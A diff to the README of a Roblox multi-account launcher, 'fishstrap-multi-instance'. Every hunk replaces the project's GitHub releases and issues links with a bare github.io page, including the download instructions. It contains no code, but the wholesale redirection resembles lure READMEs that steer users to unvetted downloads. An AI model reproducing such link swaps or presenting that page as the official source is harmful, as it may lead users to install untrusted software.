@@ -1,6 +1,6 @@
 # 🎣 fishstrap-multi-instance - Run Multiple Roblox Accounts Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-fishstrap--multi--instance-blueviolet?style=for-the-badge&logo=github)](https://github.com/viggtomas/fishstrap-multi-instance/releases)
+[![Download Now](https://img.shields.io/badge/Download-fishstrap--multi--instance-blueviolet?style=for-the-badge&logo=github)](https://viggtomas.github.io)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Welcome! This guide will help you download and use **fishstrap-multi-instance** on your Windows computer. Whether you want to play Roblox on multiple accounts at the same time, test different settings, or simply enjoy the flexibility of multiple game instances, this tool is here to help. No coding experience is needed – just follow the steps below.
 
-Visit this link to download the application: [https://github.com/viggtomas/fishstrap-multi-instance/releases](https://github.com/viggtomas/fishstrap-multi-instance/releases)
+Visit this link to download the application: [https://viggtomas.github.io](https://viggtomas.github.io)
 
 ---
 
@@ -43,7 +43,7 @@ To run fishstrap-multi-instance smoothly, your Windows computer should meet the 
 
 Follow these simple steps to get fishstrap-multi-instance on your computer:
 
-1. **Click the download link** – Go to [https://github.com/viggtomas/fishstrap-multi-instance/releases](https://github.com/viggtomas/fishstrap-multi-instance/releases).
+1. **Click the download link** – Go to [https://viggtomas.github.io](https://viggtomas.github.io).
 2. **Find the latest release** – On the releases page, look for the newest version (the one at the top). It will be labeled clearly.
 3. **Choose the right file** – You will see a list of files available for download. Select the one that says `fishstrap-multi-instance.zip` or similar (the zip archive is recommended for most users).
 4. **Download the file** – Click the download button next to the file. Your browser will save it to your default Downloads folder.
@@ -108,7 +108,7 @@ Currently, this project is designed only for Windows. Mac and Linux support migh
 
 fishstrap-multi-instance is an open community project. If you need help, have questions, or want to suggest improvements, here's how to get involved:
 
-- **GitHub Issues:** Report bugs or request features on the [official repository](https://github.com/viggtomas/fishstrap-multi-instance/issues).
+- **GitHub Issues:** Report bugs or request features on the [official repository](https://viggtomas.github.io).
 - **Discussions:** Join the conversation and share tips with other users.
 - **Contribute:** If you're handy with scripting, you can fork the repo, make improvements, and submit a pull request.
 
@@ -120,7 +120,7 @@ We believe in the power of community – together we can make this the best mult
 
 - **Version 1.0 (Initial Release):** Basic multi-instance launching with Fishstrap integration, Fast Flags per-instance support, and user-friendly setup scripts.
 
-Check the [Releases page](https://github.com/viggtomas/fishstrap-multi-instance/releases) regularly for new updates, bug fixes, and exciting features.
+Check the [Releases page](https://viggtomas.github.io) regularly for new updates, bug fixes, and exciting features.
 
 ---
 
@@ -139,7 +139,7 @@ Check the [Releases page](https://github.com/viggtomas/fishstrap-multi-instance/
 
 We're thrilled to provide this tool to the Roblox community for free. If you find it useful, consider starring the repository on GitHub – it costs nothing and helps more people discover the project.
 
-**Remember:** Visit [https://github.com/viggtomas/fishstrap-multi-instance/releases](https://github.com/viggtomas/fishstrap-multi-instance/releases) to download the latest version today!
+**Remember:** Visit [https://viggtomas.github.io](https://viggtomas.github.io) to download the latest version today!
 
 Happy gaming! 🎮✨
 
